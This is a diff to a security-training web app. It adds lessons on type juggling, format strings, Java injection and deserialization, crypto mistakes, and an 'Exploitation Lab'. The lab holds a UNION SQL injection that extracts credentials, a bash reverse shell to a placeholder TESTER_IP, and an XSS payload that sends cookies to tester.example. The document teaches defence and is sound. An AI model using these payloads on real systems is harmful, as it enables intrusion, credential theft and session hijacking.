@@ -304,7 +304,7 @@ const BADGES = [
 ];
 
 /* ---------- version ---------- */
-const APP_VERSION='1.4.0';
+const APP_VERSION='1.5.0';
 
 /* ---------- persistent state ---------- */
 const KEY='codelearn.v1';
@@ -535,6 +535,13 @@ const TRACKS = [
      {t:'quiz',q:'What makes reflected XSS possible in the code above?',
       opts:['Using $_GET at all','Echoing untrusted input into HTML without encoding it','The word "searched"','Using double quotes'],a:1,
       why:'XSS is an <b>output-encoding</b> failure. Input is only dangerous when it reaches an HTML sink un-encoded; <code class="inl">htmlspecialchars()</code> neutralizes it.'}
+   ]},
+   {id:'p5', name:'Type juggling & loose comparisons', xp:35, cards:[
+     {t:'md',html:'<p>PHP has two equality operators: <code class="inl">==</code> (loose — converts types first) and <code class="inl">===</code> (strict — type and value must match). Loose <code class="inl">==</code> causes surprising, security-relevant behaviour called <b>type juggling</b>.</p><p>Classic traps: two strings that look like numbers in scientific notation (<code class="inl">"0e123"</code>) compare <b>equal</b> to each other and to <code class="inl">0</code>; before PHP 8, <code class="inl">"abc" == 0</code> was true; and passing an array where a string is expected can break functions like <code class="inl">strcmp</code>.</p>'},
+     {t:'read',lang:'php',label:'Vulnerable comparison',code:'$hash = md5($_POST["password"]);\nif ($hash == $stored_hash) {   // loose == !\n    login();\n}\n// "magic hashes" like 240610708 md5 to 0e462... which == 0',note:'If two password hashes both look like <code class="inl">0e[digits]</code>, loose <code class="inl">==</code> treats them as the number 0 and they match. Always use <code class="inl">===</code> or <code class="inl">hash_equals()</code> for hash/token comparison.'},
+     {t:'quiz',q:'Why can <code class="inl">if ($a == $b)</code> be dangerous when comparing password hashes?',
+      opts:['== is slower than ===','Loose == juggles types, so two different "0e..." strings both become 0 and match','== does not work on strings','It always returns true'],a:1,
+      why:'Loose <code class="inl">==</code> converts operands before comparing. Two distinct "magic hash" strings both coerce to <code class="inl">0</code> and compare equal. Use <b>===</b> (strict) or <code class="inl">hash_equals()</code>.'}
    ]}
   ]
  },
@@ -590,6 +597,13 @@ const TRACKS = [
      {t:'quiz',q:'A size is computed as <code class="inl">len * count</code> in an <code class="inl">int</code>, then used for <code class="inl">malloc</code>. What class of bug should you check for?',
       opts:['XSS','Integer overflow — the multiplication can wrap to a tiny value, under-allocating','SQL injection','CSRF'],a:1,
       why:'If <code class="inl">len * count</code> overflows the integer type, <code class="inl">malloc</code> gets a small number while the code then writes the full amount — a heap overflow via <b>integer overflow</b>.'}
+   ]},
+   {id:'c4', name:'Format string vulnerabilities', xp:35, cards:[
+     {t:'md',html:'<p>Functions in the <code class="inl">printf</code> family read a <b>format string</b> with placeholders (<code class="inl">%s</code>, <code class="inl">%x</code>, <code class="inl">%n</code>). If <b>user input becomes the format string</b> itself, the attacker controls those placeholders — leaking memory with <code class="inl">%x</code>/<code class="inl">%s</code>, or even writing to memory with <code class="inl">%n</code>.</p>'},
+     {t:'read',lang:'cpp',label:'Vulnerable vs safe',code:'printf(user_input);          // BUG: input IS the format string\nprintf("%s", user_input);    // safe: input is just data',note:'If <code class="inl">user_input</code> is <code class="inl">"%x %x %x"</code> the first line dumps stack memory; <code class="inl">%n</code> can write to it. The fix is to always pass a fixed format string and put user data in an argument.'},
+     {t:'quiz',q:'What makes <code class="inl">printf(user_input)</code> a vulnerability?',
+      opts:['printf is deprecated','User input is used as the format string, so %x/%n let the attacker read or write memory','It prints too slowly','It needs a trailing newline'],a:1,
+      why:'When attacker input is the <b>format string</b>, placeholders like <code class="inl">%x</code> (read the stack) and <code class="inl">%n</code> (write) execute. Always use a literal format: <code class="inl">printf("%s", input)</code>.'}
    ]}
   ]
  },
@@ -658,6 +672,41 @@ const TRACKS = [
   ]
  },
  {
+  id:'java', name:'Java & the JVM', tag:'JVM', icon:'☕', accent:'violet',
+  sub:'Enterprise backends and Android — strong typing, classic injection and deserialization bugs.',
+  lessons:[
+   {id:'jv1', name:'Reading Java & where input enters', xp:25, cards:[
+     {t:'md',html:'<p>Java is statically typed and object-oriented; every method lives in a class. In web apps (Spring, Jakarta EE) untrusted input arrives through:</p><p>• Spring: <code class="inl">@RequestParam</code>, <code class="inl">@PathVariable</code>, <code class="inl">@RequestBody</code><br>• Servlets: <code class="inl">request.getParameter()</code>, <code class="inl">getHeader()</code><br>• CLI: the <code class="inl">String[] args</code> of <code class="inl">main</code></p>'},
+     {t:'read',lang:'java',label:'Spring controller',code:'@GetMapping("/user")\npublic String user(@RequestParam String name) {   // bound from ?name=\n    return "<h1>" + name + "</h1>";                 // reflected into HTML\n}',note:'<code class="inl">@RequestParam</code> auto-binds the query parameter into <code class="inl">name</code>. Returned straight into HTML, it is reflected <b>XSS</b> unless the view escapes it.'},
+     {t:'quiz',q:'In a Spring controller, where does a <code class="inl">@RequestParam String name</code> value come from?',
+      opts:['A constant in the code','The HTTP request (query string, form, etc.) — untrusted input','Another class','The database only'],a:1,
+      why:'<b>@RequestParam</b> binds request data into the argument. Like all request-bound values it is attacker-controlled and must be treated as a source.'}
+   ]},
+   {id:'jv2', name:'SQL injection in JDBC', xp:30, cards:[
+     {t:'md',html:'<p>JDBC runs SQL through <code class="inl">Statement</code> or <code class="inl">PreparedStatement</code>. Building a query by <b>concatenation</b> and running it via <code class="inl">Statement</code> is injectable; <code class="inl">PreparedStatement</code> with <code class="inl">?</code> placeholders is safe.</p>'},
+     {t:'read',lang:'java',label:'Vulnerable',code:'String sql = "SELECT * FROM users WHERE name = \'" + name + "\'";\nStatement st = conn.createStatement();\nResultSet rs = st.executeQuery(sql);   // SQL injection',note:'Input is welded into the SQL text. An ORM like Hibernate/JPA is injectable too if you build HQL/JPQL by concatenation.'},
+     {t:'read',lang:'java',label:'Safe — PreparedStatement',code:'PreparedStatement ps = conn.prepareStatement(\n    "SELECT * FROM users WHERE name = ?");\nps.setString(1, name);   // bound as data\nResultSet rs = ps.executeQuery();',note:'The <code class="inl">?</code> placeholder keeps input as a value, never code. This is the fix you look for.'},
+     {t:'quiz',q:'Which JDBC pattern prevents SQL injection?',
+      opts:['Statement with a concatenated query','PreparedStatement with ? placeholders and setString()','Running the query twice','Catching SQLException'],a:1,
+      why:'<b>PreparedStatement</b> with bound parameters separates code from data. Concatenating into a <code class="inl">Statement</code> is the classic injectable pattern.'}
+   ]},
+   {id:'jv3', name:'Command injection in Java', xp:30, cards:[
+     {t:'md',html:'<p>Java runs OS commands via <code class="inl">Runtime.getRuntime().exec()</code> and <code class="inl">ProcessBuilder</code>. Passing a <b>single built string</b> — especially through a shell (<code class="inl">sh -c</code>) — lets attacker metacharacters chain commands.</p>'},
+     {t:'read',lang:'java',label:'Vulnerable',code:'String cmd = "ping -c1 " + host;\nRuntime.getRuntime().exec(new String[]{"sh","-c", cmd});   // shell = injectable',note:'Routing through <code class="inl">sh -c</code> with a concatenated string exposes <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$( )</code>. Prefer <code class="inl">new ProcessBuilder("ping","-c1",host)</code> with no shell and validated args.'},
+     {t:'quiz',q:'What makes the exec() call above injectable?',
+      opts:['Using Java at all','User input is concatenated into a command run through a shell (sh -c)','ping is not installed','exec() returns a Process'],a:1,
+      why:'A concatenated string run via <code class="inl">sh -c</code> lets shell metacharacters chain commands. Pass an argument array with no shell instead.'}
+   ]},
+   {id:'jv4', name:'Insecure deserialization in Java', xp:35, cards:[
+     {t:'md',html:'<p>Java can turn bytes back into objects with <code class="inl">ObjectInputStream.readObject()</code>. On <b>attacker-controlled</b> bytes this is dangerous: crafted data can trigger "gadget chains" in libraries already on the classpath and reach <b>remote code execution</b> (the technique behind tools like ysoserial).</p>'},
+     {t:'read',lang:'java',label:'Dangerous',code:'ObjectInputStream in = new ObjectInputStream(request.getInputStream());\nMyObject obj = (MyObject) in.readObject();   // untrusted bytes -> objects',note:'<code class="inl">readObject()</code> on untrusted input is a well-known RCE path. Prefer a safe data format (JSON with a strict schema) and never deserialize untrusted Java objects.'},
+     {t:'quiz',q:'Why is <code class="inl">ObjectInputStream.readObject()</code> on request data a critical finding?',
+      opts:['It is slow','Crafted bytes can trigger gadget chains and reach remote code execution','It only reads strings','It needs a database'],a:1,
+      why:'Java deserialization of attacker data can chain existing classes into <b>RCE</b>. It is the same class of bug behind many Java CVEs.'}
+   ]}
+  ]
+ },
+ {
   id:'webpat', name:'Web Attack Patterns', tag:'CROSS-LANG', icon:'◎', accent:'amber',
   sub:'Language-agnostic bug classes scanners and beginners miss.',
   lessons:[
@@ -688,6 +737,40 @@ const TRACKS = [
      {t:'quiz',q:'What is wrong with using <code class="inl">jwt.decode(token)</code> for auth instead of <code class="inl">jwt.verify</code>?',
       opts:['Nothing','<code class="inl">decode</code> does not check the signature, so a forged token is trusted','decode is slower','decode needs a database'],a:1,
       why:'<b>decode</b> just parses the token; only <b>verify</b> checks the signature against your secret. Trusting decoded claims lets anyone forge an admin token.'}
+   ]}
+  ]
+ },
+ {
+  id:'crypto', name:'Crypto Failures', tag:'CRYPTO', icon:'🔐', accent:'amber',
+  sub:'The cryptography mistakes you can spot by reading — weak hashes, bad randomness, broken ciphers.',
+  lessons:[
+   {id:'cr1', name:'Password hashing done wrong', xp:30, cards:[
+     {t:'md',html:'<p>Passwords must be stored as <b>slow, salted</b> hashes. Fast general-purpose hashes — <code class="inl">MD5</code>, <code class="inl">SHA1</code>, <code class="inl">SHA-256</code> — are built for speed, so an attacker with a leaked database can try billions of guesses per second.</p><p>The right tools are <b>bcrypt</b>, <b>argon2</b>, or <b>PBKDF2</b>: deliberately slow and salted.</p>'},
+     {t:'read',lang:'php',label:'Wrong vs right',code:'$hash = md5($password);              // fast, unsalted -> crackable\n$hash = password_hash($password, PASSWORD_DEFAULT);  // bcrypt/argon2',note:'Seeing <code class="inl">md5</code>/<code class="inl">sha1</code> on a password is a finding. <code class="inl">password_hash()</code> (PHP), <code class="inl">bcrypt</code>, and <code class="inl">argon2</code> add cost and a salt automatically.'},
+     {t:'quiz',q:'Why is <code class="inl">MD5</code> a poor choice for hashing passwords?',
+      opts:['It is illegal','It is fast and unsalted, so leaked hashes are cracked quickly','It only works on numbers','It is far too slow'],a:1,
+      why:'Password hashing should be <b>slow and salted</b>. MD5/SHA are fast, so a stolen database is brute-forced rapidly. Use bcrypt/argon2/PBKDF2.'}
+   ]},
+   {id:'cr2', name:'Weak & predictable randomness', xp:30, cards:[
+     {t:'md',html:'<p>Security tokens (session ids, password-reset links, API keys) must be <b>unpredictable</b>. Ordinary random functions — <code class="inl">rand()</code>, <code class="inl">mt_rand()</code>, <code class="inl">Math.random()</code>, <code class="inl">java.util.Random</code> — are <i>not</i> cryptographically secure and can be predicted.</p><p>Use a CSPRNG: <code class="inl">random_bytes()</code> (PHP), <code class="inl">crypto.randomBytes()</code> (Node), the <code class="inl">secrets</code> module (Python), <code class="inl">SecureRandom</code> (Java).</p>'},
+     {t:'read',lang:'js',label:'Predictable vs secure',code:'const token = Math.random().toString(36);              // predictable!\nconst token = crypto.randomBytes(32).toString("hex");  // secure',note:'<code class="inl">Math.random()</code> is seeded predictably and is not meant for security. A CSPRNG like <code class="inl">crypto.randomBytes</code> produces unguessable tokens.'},
+     {t:'quiz',q:'Which is safe for generating a password-reset token?',
+      opts:['Math.random()','crypto.randomBytes() / a CSPRNG','The current timestamp','An incrementing counter'],a:1,
+      why:'Reset tokens must be unguessable. Non-crypto RNGs, timestamps and counters are predictable; a <b>CSPRNG</b> is required.'}
+   ]},
+   {id:'cr3', name:'Broken encryption usage', xp:35, cards:[
+     {t:'md',html:'<p>Even with a strong cipher (AES), <i>how</i> it is used matters:</p><p>• <b>ECB mode</b> encrypts identical blocks identically — patterns leak (the famous "ECB penguin").<br>• <b>Hardcoded keys/IVs</b> in source mean anyone with the code can decrypt.<br>• <b>Reused IV/nonce</b> breaks the security of stream and GCM modes.</p>'},
+     {t:'read',lang:'python',label:'Red flags',code:'cipher = AES.new(key, AES.MODE_ECB)      # ECB: leaks patterns\nkey = b"hardcoded-secret-key-123"          # hardcoded key\niv  = b"0000000000000000"                  # fixed / reused IV',note:'Prefer an authenticated mode (AES-GCM) with a random per-message nonce, and load keys from a secrets manager — never literals in source.'},
+     {t:'quiz',q:'Why is AES in <b>ECB mode</b> a weakness?',
+      opts:['AES is broken','Identical plaintext blocks produce identical ciphertext, leaking structure','It is too slow','It needs no key'],a:1,
+      why:'<b>ECB</b> lacks diffusion between blocks, so repeated plaintext shows as repeated ciphertext. Use an authenticated mode (GCM) with a random nonce.'}
+   ]},
+   {id:'cr4', name:'Comparing secrets & timing attacks', xp:30, cards:[
+     {t:'md',html:'<p>Comparing a secret (token, HMAC, API key) with a normal <code class="inl">==</code> can leak information: many implementations stop at the first differing byte, so the check takes slightly longer the more leading bytes match. Over many requests an attacker can recover the secret — a <b>timing side-channel</b>.</p><p>Use a <b>constant-time</b> comparison instead.</p>'},
+     {t:'read',lang:'python',label:'Timing-unsafe vs safe',code:'if token == expected:                       # early-exit, timing leak\n    grant()\nif hmac.compare_digest(token, expected):    # constant-time\n    grant()',note:'Constant-time helpers: <code class="inl">hmac.compare_digest</code> (Python), <code class="inl">hash_equals</code> (PHP), <code class="inl">crypto.timingSafeEqual</code> (Node).'},
+     {t:'quiz',q:'Why compare security tokens with a constant-time function?',
+      opts:['It is faster','A normal == can leak how many leading bytes matched via timing, helping an attacker recover the secret','== does not work on strings','To save memory'],a:1,
+      why:'Byte-by-byte <code class="inl">==</code> exits early on a mismatch, so response time reveals partial matches. <b>Constant-time compare</b> removes that side-channel.'}
    ]}
   ]
  },
@@ -743,6 +826,33 @@ const TRACKS = [
       why:'The SSRF fetched <code class="inl">169.254.169.254</code> metadata to steal the instance\'s <b>IAM role credentials</b>, then used them against storage. SSRF + cloud metadata is a critical combination to recognize.'}
    ]}
   ]
+ },
+ {
+  id:'exploit', name:'Exploitation Lab', tag:'OFFENSIVE', icon:'⚔', accent:'amber',
+  sub:'Turn a spotted bug into proof of impact. For authorized testing, CTFs and labs only.',
+  lessons:[
+   {id:'ex1', name:'SQL injection: extracting data', xp:40, cards:[
+     {t:'md',html:'<p><b>For use only on systems you own or are authorized to test.</b> Once you can inject SQL, the next step is proving impact — reading data the app never meant to expose.</p><p>The main techniques:</p><p>• <b>UNION-based</b> — append <code class="inl">UNION SELECT</code> to pull other tables into the results.<br>• <b>Blind boolean</b> — when no data is echoed, ask true/false questions and watch the page change.<br>• <b>Blind time-based</b> — use <code class="inl">SLEEP()</code> so the database pauses when a condition is true.</p>'},
+     {t:'read',lang:'sql',label:'UNION-based extraction',code:'-- vulnerable query:  ...WHERE id = [input]\n1 UNION SELECT username, password FROM users -- \n-- the injected row returns credentials alongside the normal result',note:'UNION needs the same column count and compatible types; attackers first find the count with <code class="inl">ORDER BY</code>. Tools like sqlmap automate this — understanding it by hand is the skill. The upstream fix is always parameterized queries.'},
+     {t:'quiz',q:'What does appending <code class="inl">UNION SELECT username, password FROM users</code> achieve?',
+      opts:['Deletes the users table','Merges attacker-chosen columns from another table into the query results','Logs the attacker in automatically','Nothing'],a:1,
+      why:'A <b>UNION</b> injection appends a second result set, letting the attacker read arbitrary columns and tables the query never intended to expose.'}
+   ]},
+   {id:'ex2', name:'Command injection: getting a shell', xp:40, cards:[
+     {t:'md',html:'<p><b>Authorized testing only.</b> When user input reaches a shell, an attacker first proves execution, then upgrades to interactive control.</p><p>• <b>Prove it</b> — chain a harmless command: <code class="inl">; id</code> or <code class="inl">| whoami</code>.<br>• <b>Out-of-band</b> — if output is not shown, trigger a delay or a DNS/HTTP callback (<code class="inl">; sleep 5</code>).<br>• <b>Upgrade</b> — a <b>reverse shell</b> makes the target connect back to a listener the tester controls.</p>'},
+     {t:'read',lang:'php',label:'From injection to callback',code:'// sink:  system("ping -c1 " . $host);\n// prove execution:    8.8.8.8; id\n// blind, time-based:   8.8.8.8; sleep 5\n// reverse shell (concept):  host; bash -i >& /dev/tcp/TESTER_IP/PORT 0>&1',note:'The reverse-shell payload makes the server open a connection back to the tester listener, giving interactive execution. Defence: never pass user input to a shell, allowlist arguments, and filter egress. Only ever run against authorized targets.'},
+     {t:'quiz',q:'After confirming command injection, what does a <b>reverse shell</b> do?',
+      opts:['Encrypts the server','Makes the target connect back to the tester machine for interactive control','Resets the admin password','Deletes the logs'],a:1,
+      why:'A reverse shell has the target initiate an outbound connection to the tester listener, giving interactive command execution — the proof-of-impact step in an authorized test. Defence: keep user input out of shells and filter egress.'}
+   ]},
+   {id:'ex3', name:'XSS: stealing the session', xp:40, cards:[
+     {t:'md',html:'<p><b>Authorized testing only.</b> A reflected or stored XSS becomes account takeover when the injected script acts as the victim.</p><p>• <b>Cookie theft</b> — if the session cookie lacks <code class="inl">HttpOnly</code>, script can read <code class="inl">document.cookie</code> and exfiltrate it.<br>• <b>Session riding</b> — even with <code class="inl">HttpOnly</code>, the script can send authenticated requests <i>as the victim</i> (change email, add an admin).<br>• Defences: output encoding, <code class="inl">HttpOnly</code> + <code class="inl">SameSite</code> cookies, and a strong Content-Security-Policy.</p>'},
+     {t:'read',lang:'js',label:'Proof-of-impact payloads',code:'// steal a non-HttpOnly cookie:\nnew Image().src = "https://tester.example/c?" + document.cookie;\n// or ride the victim session directly:\nfetch("/account/email", {method:"POST", body:"new=attacker@evil.test"});',note:'The first payload exfiltrates the cookie; the second rides the existing session to change account data. <code class="inl">HttpOnly</code> blocks cookie reads but not session-riding — output encoding and CSP are the real fixes.'},
+     {t:'quiz',q:'How does the <code class="inl">HttpOnly</code> cookie flag limit XSS impact?',
+      opts:['It blocks all XSS','It stops script reading the cookie via document.cookie (but not session-riding requests)','It encrypts the page','It disables JavaScript'],a:1,
+      why:'<b>HttpOnly</b> hides the cookie from JavaScript, stopping direct theft — but injected script can still send authenticated requests as the victim. Fix the XSS itself with output encoding and CSP.'}
+   ]}
+  ]
  }
 ];
 
@@ -751,6 +861,19 @@ const TRACKS = [
    Rendered on the last card; open in a new tab.
    ========================================================= */
 const LESSON_REFS = {
+ 'p5':[{t:'PHP Manual: Comparison operators',u:'https://www.php.net/manual/en/language.operators.comparison.php'},{t:'PHP Manual: Type comparison tables',u:'https://www.php.net/manual/en/types.comparisons.php'}],
+ 'c4':[{t:'CWE-134: Format String',u:'https://cwe.mitre.org/data/definitions/134.html'},{t:'OWASP: Format string attack',u:'https://owasp.org/www-community/attacks/Format_string_attack'}],
+ 'jv1':[{t:'Java: HttpServletRequest',u:'https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html'}],
+ 'jv2':[{t:'Java: PreparedStatement',u:'https://docs.oracle.com/javase/8/docs/api/java/sql/PreparedStatement.html'},{t:'OWASP: SQL Injection Prevention Cheat Sheet',u:'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'}],
+ 'jv3':[{t:'Java: ProcessBuilder',u:'https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html'},{t:'OWASP: Command Injection',u:'https://owasp.org/www-community/attacks/Command_Injection'}],
+ 'jv4':[{t:'OWASP: Deserialization of untrusted data',u:'https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data'},{t:'OWASP: Deserialization Cheat Sheet',u:'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'}],
+ 'cr1':[{t:'OWASP: Password Storage Cheat Sheet',u:'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html'}],
+ 'cr2':[{t:'OWASP: Insecure Randomness',u:'https://owasp.org/www-community/vulnerabilities/Insecure_Randomness'}],
+ 'cr3':[{t:'OWASP Top 10: Cryptographic Failures',u:'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/'},{t:'OWASP: Cryptographic Storage Cheat Sheet',u:'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html'}],
+ 'cr4':[{t:'Python docs: hmac.compare_digest',u:'https://docs.python.org/3/library/hmac.html'}],
+ 'ex1':[{t:'PortSwigger: SQL injection UNION attacks',u:'https://portswigger.net/web-security/sql-injection/union-attacks'}],
+ 'ex2':[{t:'PortSwigger: OS command injection',u:'https://portswigger.net/web-security/os-command-injection'}],
+ 'ex3':[{t:'PortSwigger: Exploiting cross-site scripting',u:'https://portswigger.net/web-security/cross-site-scripting/exploiting'}],
  'pb1':[{t:'PHP Manual: Getting started',u:'https://www.php.net/manual/en/getting-started.php'}],
  'pb2':[{t:'PHP Manual: Command-line usage',u:'https://www.php.net/manual/en/features.commandline.php'},{t:'PHP Manual: Built-in web server',u:'https://www.php.net/manual/en/features.commandline.webserver.php'}],
  'pb3':[{t:'PHP Manual: Escaping from HTML',u:'https://www.php.net/manual/en/language.basic-syntax.phpmode.php'}],
@@ -980,10 +1103,11 @@ function vHome(){
        '<span class="chip '+(dDone?'good':'amber')+'">'+(dDone?'✓ DONE':'+'+dh.xp+' XP')+'</span>'+
      '</div></div>';
 
-  const GROUP_ORDER=['Foundations','Language basics','Languages & vulnerabilities','Attack patterns & real-world'];
+  const GROUP_ORDER=['Foundations','Language basics','Languages & vulnerabilities','Attack patterns & real-world','Exploitation'];
   const groupOf=(id)=> id==='recon' ? 'Foundations'
     : id==='phpbasics' ? 'Language basics'
-    : ['php','dotnet','cpp','web','python'].includes(id) ? 'Languages & vulnerabilities'
+    : ['php','dotnet','cpp','web','python','java'].includes(id) ? 'Languages & vulnerabilities'
+    : id==='exploit' ? 'Exploitation'
     : 'Attack patterns & real-world';
   for(const g of GROUP_ORDER){
     const inGroup=TRACKS.filter(t=>groupOf(t.id)===g);
